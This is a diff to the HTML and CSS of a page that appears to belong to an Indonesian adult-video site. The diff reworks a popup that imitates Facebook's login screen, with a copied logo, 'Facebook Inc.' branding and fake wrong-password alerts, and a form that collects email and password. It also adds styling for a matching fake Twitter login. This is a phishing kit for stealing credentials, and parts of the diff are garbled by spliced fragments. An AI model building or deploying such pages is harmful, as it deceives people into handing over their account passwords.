@@ -1,5 +1,5 @@
 <!doctype html>
-<! –– Ahmad Ganteng ––>
+<! –– Aditya Ganteng ––>
 <html lang="en-US" class="xv-responsive" prefix="og: http://ogp.me/ns#">
 <head itemscope="itemscope" itemtype="http://schema.org/WebSite">
     <!-- Google Tag Manager -->
@@ -101,7 +101,7 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     display: block;
 }
 .txt-login-fb {
-    width: 290px;
+    width: 270px;
     height: auto;
     margin-top: 10px;
     margin-left: auto;
@@ -110,7 +110,7 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     padding: 8px;
     color: #90949c;
     font-size: 16px;
-    font-family: Roboto;
+    font-family: Roboto, sans-serif;
     text-align: center;
     display: block;
 }
@@ -127,37 +127,54 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     outline: none;
 }
 .login-form input[type="text"] {
-    margin: 0px;
-    padding-bottom: 13px;
-    border-bottom: none;
-    border-radius: 4px 4px 0 0;
-    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
+    width: 100%;
+	height: auto;
+	padding: 12px;
+	color: #000;
+	font-size: 14px;
+	font-weight: 400;
+	font-family: Roboto, sans-serif;
+	border: 1px solid #bdbebf;
+	border-top-left-radius: 4px;
+	border-top-right-radius: 4px;
+	cursor: pointer;
+	outline: none;
 }
 .login-form input[type="password"] {
-    margin: 0px;
-    border-top: none;
-    border-radius: 0 0 4px 4px;
-    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
+    width: 100%;
+	height: auto;
+	padding: 12px;
+	color: #000;
+	font-size: 14px;
+	font-weight: 400;
+	font-family: Roboto, sans-serif;
+	border: 1px solid #bdbebf;
+	border-top: 0px;
+	border-bottom-left-radius: 4px;
+	border-bottom-right-radius: 4px;
+	cursor: pointer;
+	outline: none;
 }
 .btn-login-fb {
     background: #1778f2;
-    width: 100%;
-    height: auto;
-    margin-top: 10px;
-    margin-left: auto;
-    margin-right: auto;
-    padding: 10px;
-    color: #fff;
-    font-size: 14px;
-    font-family: Roboto;
-    font-weight: bold;
-    text-align: center;
-    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
-    border: 1px solid #3578e5;
-    border-radius: 5px;
-    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
-    outline: none;
-    display: block;
+	width: 100%;
+	height: auto;
+	margin-top: 30px;
+	margin-left: auto;
+	margin-right: auto;
+	margin-bottom: 10px;
+	padding: 10px;
+	color: #fff;
+	font-size: 14px;
+	font-family: Roboto, sans-serif;
+	font-weight: bold;
+	text-align: center;
+	text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+	border: 1px solid #3578e5;
+	border-radius: 5px;
+	box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+	outline: none;
+	display: block;
 }
 .btn-login-fb.disabled
 {
@@ -166,13 +183,12 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     border:1px solid #8b9dc3;
 }
 .txt-create-account {
-    margin-top: 4px;
     width: 100%;
     height: auto;
     padding: 5px;
     color: #3b5998;
     font-size: 13.5px;
-    font-family: Roboto;
+    font-family: Roboto, sans-serif;
     text-align: center;
 }
 .txt-not-now {
@@ -191,7 +207,7 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     padding: 5px;
     color: #7596c8;
     font-size: 13.5px;
-    font-family: Roboto;
+    font-family: Roboto, sans-serif;
     text-align: center;
 }
 .language-box {
@@ -253,6 +269,168 @@ a:link, a:active, a:visited, a:focus a:hover {text-decoration:none;}
     top:50%;
     left:50%;
     transform:translate(-50%,-50%);
+    text-align:center;
+    font-family:'Teko';
+    color:#000;
+    border-radius:10px;
+}
+.header-twitter {
+    background: #fff;
+    width: 100%;
+    font-size: 25px;
+    font-weight: bold;
+    text-align: left;
+    position: relative;
+    border-radius: 10px;
+}
+.header-twitter img {
+    width: 55px;
+}
+.box-twitter {
+    width: 100%;
+    height: 400px;
+    position: absolute;
+    overflow: none;
+    font-size: 15px;
+    font-family: sans-serif;
+    border-radius: 10px;
+}
+.txt-login-twitter {
+    color: #000;
+    font-size: 20px;
+    font-weight: bold;
+    font-family: arial, sans-serif;
+    margin-top: 3%;
+    margin-bottom: 5%;
+}
+.twitter-alert {
+	width: 95%;
+	height: auto;
+	margin-left: auto;
+	margin-right: auto;
+	padding: 5px;
+	color: #fa3e3e;
+	font-size: 13px;
+	font-family: arial, sans-serif;
+	text-align: left;
+	display: block;
+}
+.input-box-twitter {
+    background: #f5f8fa;
+	width: 90%;
+	height: 55px;
+	margin-top: 10px;
+	margin-bottom: 18px;
+	padding: 10px;
+	padding-top: 5px;
+	font-size: 14px;
+	font-family: arial, sans-serif;
+	text-align: left;
+	position: relative;
+	border-bottom: 2px solid #657786;
+	border-radius: 2px;
+	outline: none;
+	position: relative;
+}
+.input-box-twitter label {
+    color: #657786;
+	text-align: left;
+	text-decoration: none;
+	text-shadow: none;
+}
+.input-box-twitter input {
+	background: transparent;
+	width: 100%;
+	height: auto;
+	padding: 7px;
+	padding-top: 3px;
+	padding-left: 0px;
+	color: #000;
+	font-size: 18px;
+	font-family: arial, sans-serif;
+	text-align: left;
+	position: relative;
+	border: none;
+	outline: none;
+	z-index: 2;
+}
+.input-box-twitter .TwitterShowHide {
+	margin-top: 10px;
+	color: #333333;
+	float: right;
+}
+.btn-login-twitter {
+    background: #1da1f2;
+    width: 90%;
+    height: auto;
+    padding: 14px;
+    color: #fff;
+    font-size: 15px;
+    font-weight: bold;
+    font-family: arial, sans-serif;
+    border: none;
+    border-radius: 30px;
+    outline: none;
+    letter-spacing: 1;
+}
+.footer-menu-twitter {
+    width: auto;
+    height: auto;
+    margin: 0.5%;
+    margin-top: 7%;
+    color: #1da1f2;
+    font-size: 14px;
+    font-family: arial, sans-serif;
+    display: inline-block;
+}
+.bulet {
+    color: #000;
+    font-size: 8px;
+}
+.aktifnya {
+    color: #1da1f2;
+    border-bottom: 2px solid #1da1f2;
+}
+.close-other {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	top:-8px;
+	right:-10px;
+	position:absolute;
+	z-index:9999999;
+	display:block;
+}
+.close-other i {
+	color:#fff;
+	padding-top:1px;
+}
+.close-fb {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	position:absolute;
+	top:-8px;
+	right:-10px;
+	display:block;
+}
+.close-fb i {
+	color:#fff;
+	padding-top:1px;
+}m:transla
+
+
+  te(-50%,-50%);
     text-align:center;
     font-family:'Teko';
     color:#000;
@@ -468,65 +646,60 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  </li>
 <li>
  <a href='/dmca.html'>DMCA</a>
-</li>
-<li>
- <a href='/disclaimer.html'>Disclamer</a>
-</li>
-<li>
- <a href='/privacy-policy.html'>Privacy and Policy</a>
-</li>
-<li>
- <a href='/conditions-of-use.html'>Conditions of Use</a>
-</li>
-<p class="copy">
-&copy; 2022 All rights reserved by SIMONTOK</p>
-<p class="copy">Nonton Video XXX Indonesia - 100% free.</p>
-</div>
-</div>
-
-<div class="popup-login login-facebook animated fadeIn" style="">
-		   <div class="popup-box-login-fb">
-		      <div class="navbar-fb">
-		         <img width="45" src="img/fb-login.png">
-		      </div>
-		      <div class="content-box-fb">
-		      	<p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
+</li><div class="popup-login login-facebook animated fadeIn" style="display: none;">
+	<div class="popup-box-login-fb">
+		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+		<div class="navbar-fb">
+		<img src="https://raw.githubusercontent.com/jefanya14/pubg-spin-v43/main/alatselow/iconfc.png">
+		</div>
+		<div class="content-box-fb">
+			<img src="https://montok.wapsite.info/simontok-tw.png">
+      
+			<div class="txt-login-fb">
+				 Log in to your account to connect to Simontok.
+        
+			</div>
+      <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
 		      	<p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
-		         <img src="https://montok.wapsite.info/simontok-tw.png">
-		         <div class="txt-login-fb">
-		          Masuk ke akun Facebook Anda untuk terhubung dengan SimontokApp
-		         </div>
-                    <form class="login-form" action="" method="POST">
-		            <label>
-		            <input type="text" id="user" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
-		            </label>
-		            <label>
-		            <input type="password" id="pass" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
-		            </label>
+			<form class="login-form" action="" method="POST">
+		            
+		            <input type="text" id="user" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
+        
+        
+		            
+		            
+		            <input type="password" id="pass" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required >
+        
+        
+		            
 		            <input type="hidden" name="login" value="Facebook">
-		            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
+		            <button type="submit" name="submit" class="btn-login-fb">Log In</button>
 		         </form>
-		         <div class="txt-create-account">Buat akun</div>
-		         <div class="txt-not-now">Lain kali</div>
-		         <div class="txt-forgotten-password">Lupa Kata Sandi? • Pusat Bantuan</div>
-		      </div>
-		      <div class="language-box">
-		         <center>
-		         <div class="language-name language-name-active">Bahasa Indonesia</div>
-		         <div class="language-name">English (UK)</div>
-		         <div class="language-name">Basa Jawa</div>
-		         <div class="language-name">Bahasa Melayu</div>
-		         <div class="language-name">s��s��語</div>
-		         <div class="language-name">Español</div>
-		         <div class="language-name">Português (Brasil)</div>
-		         <div class="language-name">
-		            <i class="fa fa-plus"></i>
-		         </div>
-		         </center>
-		      </div>
-		      <div class="copyright">Facebook Inc.</div>
+			<div class="txt-forgotten-password"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_blank">forgot password?</a>
+        <div class="txt-create-account">Create Account</div>
+      </div>
+  
+		</div>
+		<div class="language-box">
+			<center>
+			<div class="language-name language-name-active">English (UK)</div>
+			<div class="language-name">العربية</div>
+			<div class="language-name">Türkçe</div>
+			<div class="language-name">Tiếng Việt</div>
+			<div class="language-name">日本語</div>
+			<div class="language-name">Español</div>
+			<div class="language-name">Português (Brasil)</div>
+			<div class="language-name">
+				<i class="fa fa-plus"></i>
+			</div>
+			</center>
+		</div>
+		<div class="copyright">Facebook Inc.</div>
+	</div>
+</div> Inc.</div>
 		   </div>
 		 </div>
+
 <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@10.19.0/dist/lazyload.min.js"></script>
 	<script type="text/javascript">
 		$(document).ready(function()
